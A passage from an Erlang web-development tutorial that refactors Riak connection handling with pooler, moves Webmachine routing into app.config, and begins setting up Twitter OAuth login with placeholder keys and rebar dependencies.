<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_core_server</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">behaviour</span><span class="p">(</span><span class="n">gen_server</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">SERVER</span><span class="p">,</span> <span class="no">?MODULE</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">start_link</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">get_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">save_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% gen_server Function Exports</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">init</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">handle_call</span><span class="o">/</span><span class="mi">3</span><span class="p">,</span> <span class="n">handle_cast</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">handle_info</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">terminate</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">code_change</span><span class="o">/</span><span class="mi">3</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">start_link</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">gen_server</span><span class="p">:</span><span class="n">start_link</span><span class="p">({</span><span class="n">local</span><span class="p">,</span> <span class="no">?SERVER</span><span class="p">},</span> <span class="no">?MODULE</span><span class="p">,</span> <span class="p">[],</span> <span class="p">[]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save_snippet</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">gen_server</span><span class="p">:</span><span class="n">call</span><span class="p">(</span><span class="no">?SERVER</span><span class="p">,</span> <span class="p">{</span><span class="n">save_snippet</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">},</span> <span class="n">infinity</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_snippet</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">gen_server</span><span class="p">:</span><span class="n">call</span><span class="p">(</span><span class="no">?SERVER</span><span class="p">,</span> <span class="p">{</span><span class="n">get_snippet</span><span class="p">,</span> <span class="nv">SnippetKey</span><span class="p">},</span> <span class="n">infinity</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% gen_server Function Definitions</span>
</span><span class='line'><span class="c">%% ------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="n">undefined</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_call</span><span class="p">({</span><span class="n">save_snippet</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">},</span> <span class="p">_</span><span class="nv">From</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">SavedSnippet</span> <span class="o">=</span> <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">)</span> <span class="k">end</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">reply</span><span class="p">,</span> <span class="nv">SavedSnippet</span><span class="p">,</span> <span class="nv">State</span><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_call</span><span class="p">({</span><span class="n">get_snippet</span><span class="p">,</span> <span class="nv">SnippetKey</span><span class="p">},</span> <span class="p">_</span><span class="nv">From</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Snippet</span> <span class="o">=</span> <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetKey</span><span class="p">)</span> <span class="k">end</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">reply</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">,</span> <span class="nv">State</span><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_call</span><span class="p">(_</span><span class="nv">Request</span><span class="p">,</span> <span class="p">_</span><span class="nv">From</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">noreply</span><span class="p">,</span> <span class="n">ok</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_cast</span><span class="p">(_</span><span class="nv">Msg</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">noreply</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">handle_info</span><span class="p">(_</span><span class="nv">Info</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">noreply</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">terminate</span><span class="p">(_</span><span class="nv">Reason</span><span class="p">,</span> <span class="p">_</span><span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">ok</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">code_change</span><span class="p">(_</span><span class="nv">OldVsn</span><span class="p">,</span> <span class="nv">State</span><span class="p">,</span> <span class="p">_</span><span class="nv">Extra</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can see we&rsquo;re making use of the <a href="https://github.com/OJ/pooler/blob/master/src/pooler.erl#L125" title="use_member">pooler:use_member</a> function to easily wrap up the management of the connection&rsquo;s usage lifetime. All traces of the old configuration are gone. We can now rebuild the application using <code>make</code>, fire it up using <code>make webstart</code> and hit the <a href="http://127.0.0.1/snippet/B41kUQ==">same page</a> as before resulting in the same content appearing on screen.</p>

<p>We have now successfully removed the old configuration and connection handling code, and we&rsquo;ve replaced it with <code>pooler</code> to handle a pool of connections to the Riak proxy. The last part of our refactor is around configuration for the front-end web application.</p>

<h2>Rewiring Configuration</h2>

<p>Our configuration is going to get more complicated, so to make sure that we&rsquo;re able to better handle and manage it we&rsquo;re going to set up a similar structure to what we had set up in the <code>csd_core</code> application (in the previous section). The first thing we&rsquo;re going to change is the way that the <strong>Webmachine</strong> routes are loaded. Right now, they&rsquo;re stored in <code>apps/tr_web/priv/dispatch.conf</code>. This configuration belongs alongside others, so we&rsquo;ll move that to an <code>app.config</code> file and re-jig the code to load it from there.</p>

<p>First up, rename the file:</p>

<pre><code>oj@air ~/code/csd/apps/csd_web/priv $ mv dispatch.conf app.config
</code></pre>

<p>Now let&rsquo;s edit it so that it takes the appropriate format:</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%%-*- mode: erlang -*-</span>
</span><span class='line'><span class="p">[</span>
</span><span class='line'>  <span class="p">{</span><span class="n">sasl</span><span class="p">,</span>
</span><span class='line'>    <span class="p">[</span>
</span><span class='line'>      <span class="p">{</span><span class="n">sasl_error_logger</span><span class="p">,</span> <span class="p">{</span><span class="n">file</span><span class="p">,</span> <span class="s">&quot;log/sasl-error.log&quot;</span><span class="p">}},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">errlog_type</span><span class="p">,</span> <span class="n">error</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error_logger_mf_dir</span><span class="p">,</span> <span class="s">&quot;log/sasl&quot;</span><span class="p">},</span>      <span class="c">% Log directory</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error_logger_mf_maxbytes</span><span class="p">,</span> <span class="mi">10485760</span><span class="p">},</span>   <span class="c">% 10 MB max file size</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error_logger_mf_maxfiles</span><span class="p">,</span> <span class="mi">5</span><span class="p">}</span>           <span class="c">% 5 files max</span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'>  <span class="p">{</span><span class="n">csd_web</span><span class="p">,</span>
</span><span class='line'>    <span class="p">[</span>
</span><span class='line'>      <span class="p">{</span><span class="n">web</span><span class="p">,</span>
</span><span class='line'>        <span class="p">[</span>
</span><span class='line'>          <span class="p">{</span><span class="n">ip</span><span class="p">,</span> <span class="s">&quot;0.0.0.0&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">port</span><span class="p">,</span> <span class="mi">8000</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">log_dir</span><span class="p">,</span> <span class="s">&quot;priv/log&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">dispatch</span><span class="p">,</span>
</span><span class='line'>            <span class="p">[</span>
</span><span class='line'>              <span class="p">{[],</span> <span class="n">csd_web_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;snippet&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">],</span> <span class="n">csd_web_snippet_resource</span><span class="p">,</span> <span class="p">[]}</span>
</span><span class='line'>            <span class="p">]</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>        <span class="p">]</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">].</span>
</span></code></pre></td></tr></table></div></figure>


<p>A few things to note here:</p>

<ol>
<li>I&rsquo;ve included the <code>sasl</code> configuration for later tweaking.</li>
<li>the <code>csd_web</code> section is named that way so that it is matches the application name. This makes the auto-wiring work.</li>
<li>The Webmachine configuration for application is now in a subsection called <code>web</code>. Inside this section is the original <code>dispatch</code> that we had in our old <code>dispatch.conf</code>. This configuration sections takes the <em>exact</em> form that Webmachine expects when we start its process in our supervisor.</li>
</ol>


<p>At this point we need to go and fiddle with the way Webmachine loads its configuration so that it picks up these details. We&rsquo;ll start by defining a helper which will make it easy to get access to configuration for the <code>csd_web</code> application.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/conf.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">conf</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">get_section</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">get_section</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">get_val</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">get_val</span><span class="o">/</span><span class="mi">3</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_section</span><span class="p">(</span><span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">get_section</span><span class="p">(</span><span class="nv">Name</span><span class="p">,</span> <span class="n">undefined</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_section</span><span class="p">(</span><span class="nv">Name</span><span class="p">,</span> <span class="nv">Default</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">application</span><span class="p">:</span><span class="n">get_env</span><span class="p">(</span><span class="n">csd_web</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">V</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">V</span><span class="p">;</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">Default</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_val</span><span class="p">(</span><span class="nv">SectionName</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">get_val</span><span class="p">(</span><span class="nv">SectionName</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="n">undefined</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_val</span><span class="p">(</span><span class="nv">SectionName</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Default</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">application</span><span class="p">:</span><span class="n">get_env</span><span class="p">(</span><span class="n">csd_web</span><span class="p">,</span> <span class="nv">SectionName</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Section</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">Name</span><span class="p">,</span> <span class="nv">Section</span><span class="p">,</span> <span class="nv">Default</span><span class="p">);</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">Default</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Configuration helpers are now in place, let&rsquo;s fix the Webmachine loader in <code>csd_web_sup.erl</code>.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_sup.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ... %</span>
</span><span class='line'><span class="c">%% @spec init([]) -&gt; SupervisorTree</span>
</span><span class='line'><span class="c">%% @doc supervisor callback.</span>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">WebConfig</span> <span class="o">=</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_section</span><span class="p">(</span><span class="n">web</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Web</span> <span class="o">=</span> <span class="p">{</span><span class="n">webmachine_mochiweb</span><span class="p">,</span>
</span><span class='line'>    <span class="p">{</span><span class="n">webmachine_mochiweb</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="p">[</span><span class="nv">WebConfig</span><span class="p">]},</span>
</span><span class='line'>    <span class="n">permanent</span><span class="p">,</span> <span class="mi">5000</span><span class="p">,</span> <span class="n">worker</span><span class="p">,</span> <span class="n">dynamic</span><span class="p">},</span>
</span><span class='line'>  <span class="nv">Processes</span> <span class="o">=</span> <span class="p">[</span><span class="nv">Web</span><span class="p">],</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span> <span class="p">{</span><span class="n">one_for_one</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">},</span> <span class="nv">Processes</span><span class="p">}</span> <span class="p">}.</span>
</span><span class='line'><span class="c">% ... snip ... %</span>
</span></code></pre></td></tr></table></div></figure>


<p>This little snippet delegates the responsibility of all Webmachine-related stuff to the <code>app.config</code> file. Let&rsquo;s include this in our <code>Makefile</code> when we start our application.</p>

<figure class='code'><figcaption><span>Makefile (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>webstart: app
</span><span class='line'>  <span class="nb">exec </span>erl -pa <span class="k">$(</span>PWD<span class="k">)</span>/apps/*/ebin -pa <span class="k">$(</span>PWD<span class="k">)</span>/deps/*/ebin -boot start_sasl -config <span class="k">$(</span>PWD<span class="k">)</span>/apps/csd_web/priv/app.config -config <span class="k">$(</span>PWD<span class="k">)</span>/apps/csd_core/priv/app.config -s reloader -s csd_core -s csd_web
</span></code></pre></td></tr></table></div></figure>


<p>All we&rsquo;ve done here is add another <code>-config</code> parameter and pointed it at the new <code>app.config</code> file in the <code>csd_web/src</code> folder. Fire up the application and it <em>should</em> behave exactly as it did before.</p>

<p>Now that we have our configuration tweaked we have finalised the last of the refactoring tasks (at least for now). It&rsquo;s now time to start designing our user login functionality.</p>

<h2>Handling User Logins</h2>

<p>Handling logins isn&rsquo;t necessarily as simple as it looks. Remember, <a href="http://www.basho.com/developers.html#Webmachine" title="Webmachine">Webmachine</a> is not a Web application framework, it&rsquo;s a feature-rich tool which helps us build well-behaving RESTful HTTP applications. The idea of a &ldquo;session&rdquo; is a (leaky) abstraction that web developers have added to web applications to aid in preventing users from having to manually sign in each time they want to access a resource. This abstraction tends to be handled through cookies.</p>

<p>We&rsquo;ll be doing the same, but given that we don&rsquo;t have anything in place at all we&rsquo;re going to have to come up with our own method for handling authentication of the user via cookies.</p>

<p>Bearing in mind that we&rsquo;ll be making use of Twitter, via OAuth, to deal with the process of authentication, the login process will consist of the following steps:</p>

<ol>
<li>The user clicks a &ldquo;login via Twitter&rdquo; button.</li>
<li>The server handles the request and negotiates a <a href="http://oauth.net/core/1.0/#auth_step1" title="Request tokens">request token</a> with Twitter using OAuth.</li>
<li>The application redirects the user to Twitter on a special URL which contains OAuth request information.</li>
<li>The user is asked to sign in to Twitter, if they haven&rsquo;t already during the course of their browser session.</li>
<li>Twitter then confirms that the user does intend to sign-in to Code Smackdown using their Twitter credentials, and redirects the user back to the application.</li>
<li>If the user approves the process, the application is handed a verification token which is then used to generate an OAuth <a href="http://oauth.net/core/1.0/#auth_step3" title="Access tokens">access token</a> with Twitter. This access token is what is used to allow the user to easily sign in to the application from this point onward.</li>
</ol>


<p>Prepare yourself, you&rsquo;re about to learn how to do OAuth in Erlang! But before we can do that, we need to register our application with Twitter.</p>

<h3>Creating a new Twitter Application</h3>

<p>Start by browsing to the <a href="https://dev.twitter.com/apps/new" title="New Twitter Application">Twitter application registration page</a> and signing in with your Twitter account credentials. You&rsquo;ll be taken to a page where you can enter the details of the application. Set the <strong>Callback URL</strong> to <code>http://127.0.0.1:4000/oauth/callback</code> for now. This points the Twitter redirect traffic back to localhost which will make things easy during development. When it comes time to deploy the application to production you can change this to the proper callback address.</p>

<p><img src="http://buffered.io/uploads/2012/02/twitter-app-create.png" title="Twitter app creation" alt="Creating an application in Twitter" /></p>

<p>Once you&rsquo;ve filled out the details you&rsquo;ll being presented with a standard set of OAuth-related bits which we&rsquo;ll be using down the track. I&rsquo;ll of course be using my own registered application name (Code Smackdown) along with the keys. Given these keys are specific to my application and should be kept secret I will not be making them part of the source (sorry).</p>

<p>Once you&rsquo;re registered, we&rsquo;re ready to take the OAuth configuration information from Twitter and plug it into our own configuration. Re-open <code>csd_web/priv/app.config</code> and create a new section called <code>twitter</code> under the <code>csd_web</code> section and add the following</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ... %</span>
</span><span class='line'>  <span class="p">{</span><span class="n">csd_web</span><span class="p">,</span>
</span><span class='line'>    <span class="p">[</span>
</span><span class='line'>      <span class="c">% ... snip ... %</span>
</span><span class='line'>      <span class="p">{</span><span class="n">twitter</span><span class="p">,</span>
</span><span class='line'>        <span class="p">[</span>
</span><span class='line'>          <span class="p">{</span><span class="n">consumer_key</span><span class="p">,</span> <span class="s">&quot;&lt; your application&#39;s key goes here &gt;&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">consumer_secret</span><span class="p">,</span> <span class="s">&quot;&lt; your application&#39;s secret goes here &gt;&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">request_token_url</span><span class="p">,</span> <span class="s">&quot;https://twitter.com/oauth/request_token&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">access_token_url</span><span class="p">,</span> <span class="s">&quot;https://twitter.com/oauth/access_token&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">authenticate_url</span><span class="p">,</span> <span class="s">&quot;https://twitter.com/oauth/authenticate&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">current_user_info_url</span><span class="p">,</span> <span class="s">&quot;https://twitter.com/account/verify_credentials.json&quot;</span><span class="p">}</span>
</span><span class='line'>        <span class="p">]</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="c">% ... snip ... %</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first two values come straight from Twitter and would have been given to you upon registering your application. The rest are URLs that we&rsquo;ll be using later on when doing the OAuth handshake.</p>

<p>Now that we&rsquo;ve got our configuration locked in we can get started on managing the requests. For this we need to understand how OAuth actually works.</p>

<p>A deep-dive into the ins and outs of OAuth is beyond the scope of this article. I recommend having a read of <a href="http://www.slideshare.net/leahculver/oauth-open-api-authentication" title="OAuth overview">this presentation on OAuth</a> which gives a good overview. The rest of this article will fill the gaps as to how it all works.</p>

<h3>Implementing OAuth</h3>

<p>Using OAuth requires us to invoke HTTP requests to Twitter. We could go through the pain of doing this manually, but instead we&rsquo;re going to use another Open Source utility which has the ability to handle this for us.</p>

<p><a href="https://github.com/tim/erlang-oauth" title="erlang-oauth">erlang-oauth</a> is an Erlang application which makes it easy to deal with OAuth requests and is ideal for what we need to do. Given that it will be a dependency on our application we need it to work nicely with rebar. Out of the box this isn&rsquo;t the case, so I have made a <a href="https://github.com/OJ/erlang-oauth/tree/rebarise" title="erlang-oauth rebar fork">fork</a> with a topic branch that has rebar-friendliness in it. We&rsquo;ll use this fork and branch in our application.</p>

<figure class='code'><figcaption><span>apps/csd_web/rebar.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%%-*- mode: erlang -*-</span>
</span><span class='line'><span class="p">{</span><span class="n">deps</span><span class="p">,</span>
</span><span class='line'>  <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="n">oauth</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/OJ/erlang-oauth&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">branch</span><span class="p">,</span> <span class="s">&quot;rebarise&quot;</span><span class="p">}}},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">webmachine</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/basho/webmachine&quot;</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">}},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">erlydtl</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/OJ/erlydtl.git&quot;</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">}}</span>
</span><span class='line'>  <span class="p">]</span>
</span><span class='line'><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>erlang-oauth</code> application requires <code>ssl</code> and <code>public_key</code> applications to be running for it to function properly, so we need to kick those applications off during start-up. We can do that by editing <code>csd_web.erl</code> like so:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
